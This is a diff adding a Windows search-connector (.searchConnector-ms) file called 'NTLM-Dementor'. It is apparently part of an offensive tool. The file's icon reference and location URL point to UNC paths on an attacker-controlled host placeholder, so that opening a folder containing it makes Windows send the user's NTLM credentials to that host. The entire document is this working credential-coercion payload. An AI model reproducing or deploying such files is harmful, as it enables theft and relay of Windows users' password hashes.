@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+  <iconReference>imageres.dll,-1002</iconReference>
+  <description>NTLM-Dementor</description>
+  <isSearchOnlyItem>false</isSearchOnlyItem>
+  <includeInStartMenuScope>true</includeInStartMenuScope>
+  <iconReference>\\<AttackerIP>\NTLM-Dementor</iconReference>
+  <templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo>
+  <simpleLocation>
+    <url>\\<AttackerIP>\NTLM-Dementor.ico</url>
+  </simpleLocation>
+</searchConnectorDescription>
